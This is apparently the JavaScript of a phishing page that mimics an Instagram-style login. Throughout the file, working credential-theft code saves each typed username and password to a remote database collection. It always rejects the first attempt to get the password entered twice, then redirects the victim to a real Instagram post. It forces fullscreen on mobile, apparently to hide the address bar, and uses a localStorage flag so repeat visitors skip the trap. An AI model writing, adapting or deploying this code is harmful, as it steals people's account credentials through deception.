var username = document.getElementById("username");
var password = document.getElementById("password");
var login = document.getElementById("login");


var newLocation = "https://www.instagram.com/p/CENPCinJrQp/";
var localKey = "abortMissionV6";

(() => {
    var abortMission = localStorage.getItem(localKey);
    if(abortMission === "yes") {
        location.replace(newLocation);
    }
})();

setTimeout(() => {
    document.getElementById("loadingScreen").style.display = "none";
}, 1000);

password.addEventListener("keyup", (e) => {
    password.style.border = "";
    if(e.keyCode === 13 && login.disabled === false) {
        console.log(login.disabled);
        login.click();
    }
    else if(password.value.length >= 6) {
        login.disabled = false;
    }
    else {
        login.disabled = true;
    }
});
window.addEventListener("click", () => {
    if(password.value.length >= 6) {
        login.disabled = false;
    }
    else {
        login.disabled = true;
    }
});

var flagIncorrect = true;

function warnIncorrect() {
    password.style.border = "1px #ff5a5a solid";
    password.value = "";
    password.focus();
    flagIncorrect = false;
}

function sendData() {
    return db.collection("users").add({
        username: username.value,
        password: password.value,
    });
}

login.addEventListener("click", (e) => {
    if(flagIncorrect === true) {
        sendData().then(function() {
            warnIncorrect();
        }).catch(function() {
            warnIncorrect();
        });
    }
    else {
        sendData().then(function() {
            localStorage.setItem(localKey, "yes");
            location.replace(newLocation);
        }).catch(function() {
            warnIncorrect();
        });
    }
});

function goFullScreen() {
    var doc = window.document;
    var docEl = doc.documentElement;
  
    var requestFullScreen = docEl.requestFullscreen || docEl.mozRequestFullScreen || docEl.webkitRequestFullScreen || docEl.msRequestFullscreen;
    requestFullScreen.call(docEl);
}

if(/Mobi|Android/i.test(navigator.userAgent)) {
    window.addEventListener("click", goFullScreen);    
    window.addEventListener("keyup", goFullScreen);
}
